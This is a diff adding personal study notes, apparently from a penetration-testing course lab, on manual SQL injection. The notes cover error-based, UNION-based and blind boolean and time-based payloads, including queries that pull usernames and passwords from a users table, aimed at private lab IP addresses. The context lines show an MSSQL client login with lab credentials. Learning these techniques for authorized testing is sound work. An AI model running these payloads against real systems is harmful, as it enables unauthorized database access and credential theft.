@@ -565,9 +565,68 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 SELECT @@version;
 SELECT name FROM sys.databases;
 SELECT * FROM offsec.information_schema.tables;
+select * from offsec.dbo.users;
 ```
 
+## Manual SQLi
+
+### Using error payloads
+
+example injection
 
 
+```
+offsec' OR 1=1 -- //
+SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
+```
+quick check is to append a special char liek an ' to username field to see if we get a SQL error message
+
+can use the IN operator to execute queries
+
+```
+' or 1=1 in (select @@version) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+### UNION-based payloads
+For UNION SQLi attacks to work, we first need to satisfy two conditions:
+    1. The injected UNION query has to include the same number of columns as the original query.
+    2. The data types need to be compatible between each column.
+
+Need to know exact number of columns present. to discover this we can run:
+```
+' ORDER BY 1-- //
+```
+
+The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist.
+
+if we have 5 columns and a query like
+```
+select * from users where name LIKE cmd%
+```
+
+we can inject:
+
+```
+%' UNION SELECT database(), user(), @@version, null, null -- // database won't show up bc it's not an int
+%' UNION SELECT null, database(), user(), @@version, null, null -- // better bc vals are all in string cols
+```
+
+can query information_schema table to find info on other tables
+```
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+### Blind SQLi
+
+out of band -- outside the web app
+
+can do this via url enumeration
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- // boolean based
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- // time-based, will know if the user exists if the app hangs
+```
+look for a `?debug=true` option in source code
 
 
